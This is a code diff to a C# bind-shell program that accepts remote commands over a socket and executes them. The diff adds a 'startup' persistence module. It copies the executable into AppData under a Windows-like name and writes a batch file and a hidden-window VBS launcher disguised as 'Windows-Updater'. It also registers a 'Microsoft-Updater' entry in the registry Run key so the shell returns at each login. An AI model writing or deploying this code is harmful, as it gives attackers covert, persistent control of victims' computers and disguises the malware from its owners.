@@ -5,16 +5,23 @@ using System.Text;
 using System.Net.Sockets;
 using System.Net;
 using System.Threading;
+using System.IO;
+using System.Diagnostics;
 
 namespace bindshell
 {
     class Program
     {
+
         
         public static string ipaddr;
         public static int port;
         public static Socket clientpacket;
         public static bool Debug;
+        public static string shellpath =   Process.GetCurrentProcess().MainModule.FileName;
+        public static string[] args;
+
+        public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         static void Main(string[] args)
         {
             ExecuteCMD("cls");
@@ -75,7 +82,7 @@ Made By youhacker55
             else
             {
                 Console.WriteLine("NO args detected Example How To Use:Bind_shell.exe 0.0.0.0 4444 ");
-                
+                // Print Error if server Detected
       
                 Console.ReadLine();
                 Environment.Exit(0);
@@ -111,9 +118,47 @@ Made By youhacker55
                         clientpacket.Send(enocde(moveworkingdir(recv.Substring(3))));
 
                     }
-                    else if (recv.Substring(0,2) == "ls")
+                    else if (recv.Substring(0, 2) == "ls")
                     {
                         continue;
+                    }
+                    else if (recv == "startup")
+                    {
+                        string vps = appdata + "\\Windows-Updater.vbs";
+                        string ppath = appdata + "\\Windows-Updater.bat";
+                        File.Copy(shellpath, appdata+"\\Windows-Drive.bin",true);
+                        string newpath = appdata + "\\Windows-Drive.bin";
+                        if (File.Exists(ppath) == true)
+                        {
+                            clientpacket.Send(enocde("[*] Persistence Already executed"));
+                            continue;
+                        }
+                        else
+                        {
+                            try
+                            {
+                                clientpacket.Send(enocde("[+] Persistence Module executed"));
+                                using (StreamWriter bPersiste = new StreamWriter(ppath))
+                                {
+                                    bPersiste.Write("cmd.exe /c " + newpath + " " + args[0] + " " + args[1] + " NODebug");
+
+                                }
+                                using (StreamWriter vbsper = new StreamWriter(vps))
+                                {
+                                    vbsper.Write("Set objShell = WScript.CreateObject(\"WScript.Shell\") \nobjShell.Run \"cmd /c  "+ppath+ "\", 0, True ");
+
+                                }
+
+                                Persiste(vps, "Microsoft-Updater");
+
+                            }
+                            catch
+                            {
+                                continue;
+                            }
+                            
+                        }
+                        
                     }
                     else
                     {
@@ -143,6 +188,15 @@ Made By youhacker55
 
             }
         }
+        public static void Persiste(string path,string name)
+        {
+
+            Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            rkInstance.SetValue(name, path);
+            rkInstance.Dispose();
+            rkInstance.Close();
+        }
+
         public static byte[] enocde(string strtoencode)
         {
             byte[] code = ASCIIEncoding.ASCII.GetBytes(strtoencode);
